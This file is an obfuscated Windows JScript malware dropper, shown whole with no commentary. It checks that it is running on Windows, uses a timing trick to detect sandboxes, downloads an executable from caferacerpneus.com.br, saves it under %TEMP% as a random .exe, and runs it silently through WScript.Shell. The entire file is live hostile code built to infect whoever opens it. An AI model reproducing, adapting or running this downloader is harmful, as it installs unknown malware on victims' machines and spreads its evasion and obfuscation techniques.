var m0 = false;
var G = "CreateObject";
var k = function jD() {return WScript[G]("WScript.Shell");}(), sF = 11;
var bh = "MSXML2.XMLHTTP";
var Z = 2123213;
var Et = 0;
function E(X0){k["Run"](X0, Et, Et);};
function vH(){return "" + bh;};
function Sc(EH, qJ){Et = Et * 1; return EH - qJ;};
function y(){return G;};
/*@cc_on
  @if (@_win32 || @_win64)
    m0 = true;
  @end
@*/
if (m0)
{
var m = "";
function X(){return 22;};
var X1 = 0; var pw = 0;
function F()
{
var Pk = new this["Date"]();
var e = Pk["getUTCMilliseconds"]();
WScript["Sleep"](X());
var Pk = new this["Date"]();
var ZL = Pk["getUTCMilliseconds"]();
WScript["Sleep"](X());
var Pk = new this["Date"]();
var Hw = Pk["getUTCMilliseconds"]();
var X1 = "t0";
X1 = Sc(ZL, e);
var pw = "ws";
pw = Sc(Hw, ZL);
m = "open";
return Sc(X1, pw);
}
var Ax = false;
var UU = false;
for (var or = Et; or < X() * 1; or++){if (F() != Et){
Ax = true; 
pw = "31" + 11 * X1 + pw; 
UU = true; 
break;
}}
function wh() {return ((Ax == true) && (Ax == UU)) ? 1 : Et;};
if (Ax && wh() && UU){
function le() {return k["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "a2KIDAL7OErKARjM.exe";};
 MK = vH();
 xY = WScript[G](MK);
 var jy = 1;
 while (jy){
try {
xY[m]("GET", "http://caferacerpneus.com.br/lw2osd", false);
xY["send"]();
p = "Sleep";
for (;;){WScript[p](X() * 11); if (xY["readystate"] >= 2 * 2) break;};
jy = Et;
} catch(hi){};
}
function Wb(E0) {var V = (1, 2, 3, 4, 5, E0); return V;};
S = WScript[y()]("ADODB.Stream");
MK = S;
MK[m]();
MK["type"] = Wb(1);
MK["write"](xY["ResponseBody"]);
S["position"] = Wb(Et);
MK["Save" + "ToFile"](le(), 2);
S["c"+"lose"]();
t = le();
E(t);
}
}

